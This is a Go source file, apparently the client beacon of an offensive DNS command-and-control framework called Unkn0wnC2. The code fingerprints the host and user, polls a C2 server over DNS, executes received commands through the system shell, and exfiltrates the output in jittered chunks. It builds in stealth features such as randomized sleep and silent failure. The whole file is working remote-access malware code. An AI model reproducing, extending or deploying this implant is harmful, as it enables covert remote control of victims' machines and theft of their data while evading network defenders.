// Package main implements the Unkn0wnC2 DNS-based Command & Control client beacon.
// This client establishes communication with the C2 server through DNS queries,
// executes commands, and exfiltrates results using encrypted DNS traffic.
package main

import (
	"crypto/md5"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Beacon represents the DNS beacon client
type Beacon struct {
	client   *DNSClient
	id       string
	hostname string
	username string
	os       string
	arch     string
	running  bool
}

// newBeacon creates a new beacon instance with system information
// including hostname, username, and operating system details.
func newBeacon() (*Beacon, error) {
	client := newDNSClient()

	// Generate unique beacon ID
	hostname, _ := os.Hostname()
	beaconID := generateBeaconID(hostname)

	// Get system info
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	if username == "" {
		username = "unknown"
	}

	return &Beacon{
		client:   client,
		id:       beaconID,
		hostname: hostname,
		username: username,
		os:       runtime.GOOS,
		arch:     runtime.GOARCH,
		running:  false,
	}, nil
}

// generateBeaconID creates a unique 4-character beacon identifier
// based on MD5 hash of the hostname for C2 tracking.
func generateBeaconID(hostname string) string {
	hash := md5.Sum([]byte(hostname + fmt.Sprintf("%d", time.Now().Unix())))
	return fmt.Sprintf("%x", hash)[:4]
}

// checkIn sends a beacon check-in to the DNS server
func (b *Beacon) checkIn() (string, error) {
	// Create check-in message with system info (limit length for DNS)
	shortHostname := b.hostname
	if len(shortHostname) > 10 {
		shortHostname = shortHostname[:10]
	}
	shortUsername := b.username
	if len(shortUsername) > 8 {
		shortUsername = shortUsername[:8]
	}
	shortOS := b.os
	if len(shortOS) > 7 {
		shortOS = shortOS[:7]
	}
	checkInData := fmt.Sprintf("CHK|%s|%s|%s|%s",
		b.id, shortHostname, shortUsername, shortOS)

	// Send check-in via DNS query
	response, err := b.client.sendCommand(checkInData)
	if err != nil {
		return "", fmt.Errorf("check-in failed: %v", err)
	}

	return response, nil
}

// executeCommand runs a system command and returns the output
func (b *Beacon) executeCommand(command string) string {
	var cmd *exec.Cmd

	// Choose appropriate shell based on OS
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", command)
	default:
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

// exfiltrateResult sends command results back via DNS using two-phase protocol with burst-based jitter
func (b *Beacon) exfiltrateResult(result string, taskID string) error {
	maxCmd := b.client.config.MaxCommandLength
	if maxCmd <= 64 {
		maxCmd = 800 // sensible default for chunked results
	}

	// Conservative estimate for overhead
	overhead := 100
	safeRawChunk := (maxCmd - overhead) / 2
	if safeRawChunk < 8 {
		safeRawChunk = 8 // minimum viable chunk
	}
	if safeRawChunk > 50 {
		safeRawChunk = 50 // conservative max to avoid DNS issues
	}

	if len(result) <= safeRawChunk {
		// Send in single RESULT message
		exfilData := fmt.Sprintf("RESULT|%s|%s|%s", b.id, taskID, result)
		_, err := b.client.sendCommand(exfilData)
		return err
	}

	// Phase 1: Send metadata about the incoming chunked result with retries
	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk

	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)

	// Retry metadata send up to 3 times - critical for establishing expectation
	var err error
	metaSent := false
	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
		_, err = b.client.sendCommand(metaData)
		if err == nil {
			metaSent = true
			break
		}
		if metaAttempt < 3 {
			time.Sleep(time.Duration(metaAttempt) * time.Second)
		}
	}

	if !metaSent {
		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
	}

	// Get jitter configuration
	jitterMin := b.client.config.ExfilJitterMinMs
	jitterMax := b.client.config.ExfilJitterMaxMs
	chunksPerBurst := b.client.config.ExfilChunksPerBurst
	burstPause := b.client.config.ExfilBurstPauseMs

	// Defaults if not configured
	if jitterMin <= 0 {
		jitterMin = 1000 // 1 second
	}
	if jitterMax < jitterMin {
		jitterMax = jitterMin + 1000
	}
	if chunksPerBurst <= 0 {
		chunksPerBurst = 10
	}
	if burstPause <= 0 {
		burstPause = 5000 // 5 seconds
	}

	// Phase 2: Send the actual data chunks with burst-based jitter and per-chunk retry
	failedChunks := 0
	for i := 0; i < totalChunks; i++ {
		start := i * safeRawChunk
		end := start + safeRawChunk
		if end > len(result) {
			end = len(result)
		}

		chunk := result[start:end]
		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%s", b.id, taskID, i+1, chunk)

		// Retry each chunk up to 2 times before giving up
		chunkSent := false
		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
			_, err := b.client.sendCommand(chunkData)
			if err == nil {
				chunkSent = true
				break
			}
			// Brief pause before retry
			if chunkAttempt < 2 {
				time.Sleep(500 * time.Millisecond)
			}
		}

		if !chunkSent {
			failedChunks++
			// Don't abort immediately - try to send remaining chunks
			// Server can handle partial results
		}

		// Apply delay after each burst
		if (i+1)%chunksPerBurst == 0 && i+1 < totalChunks {
			// Burst complete - apply jitter + burst pause
			jitterDelay := jitterMin + rand.Intn(jitterMax-jitterMin+1)
			totalDelay := time.Duration(jitterDelay+burstPause) * time.Millisecond
			time.Sleep(totalDelay)
		} else if i+1 < totalChunks {
			// Within burst - small delay for DNS rate limiting
			time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
		}
	}

	if failedChunks > 0 {
		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
	}

	return nil
}

// parseTask parses a task from the DNS server response
func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool) {
	// Expected format: TASK|taskID|command
	parts := strings.SplitN(response, "|", 3)

	if len(parts) >= 3 && parts[0] == "TASK" {
		return parts[1], parts[2], true
	}

	return "", "", false
}

// runBeacon starts the beacon loop
func (b *Beacon) runBeacon() {
	b.running = true

	// Initial check-in
	_, err := b.checkIn()
	if err != nil {
		// Silent failure for stealth
		return
	}

	// Main beacon loop with randomized sleep intervals
	sleepMin := b.client.config.SleepMin
	sleepMax := b.client.config.SleepMax

	if sleepMin <= 0 {
		sleepMin = 5 // Default minimum 5 seconds
	}
	if sleepMax <= sleepMin {
		sleepMax = sleepMin + 10 // Default maximum
	}

	for b.running {
		// Randomize sleep interval between min and max for OPSEC
		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
		time.Sleep(sleepDuration)

		// Send check-in
		response, err := b.checkIn()
		if err != nil {
			continue // Silent failure for stealth
		}

		// Check if server has a task for us
		taskID, command, isTask := b.parseTask(response)
		if isTask {
			// Execute the command
			result := b.executeCommand(command)

			// Exfiltrate the result with retries
			maxRetries := 3
			for attempt := 1; attempt <= maxRetries; attempt++ {
				err := b.exfiltrateResult(result, taskID)
				if err == nil {
					break // Success
				}
				// Failed - retry with exponential backoff
				if attempt < maxRetries {
					backoff := time.Duration(attempt*2) * time.Second
					time.Sleep(backoff)
				}
			}
		}
	}
}

// main function - entry point
func main() {
	// Random number generator auto-seeded in Go 1.20+
	// No explicit seed needed for randomized sleep intervals

	// Create beacon with embedded configuration
	beacon, err := newBeacon()
	if err != nil {
		os.Exit(1) // Silent exit for stealth
	}

	// Handle Ctrl+C gracefully
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		beacon.running = false
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	// Start the beacon
	beacon.runBeacon()
}
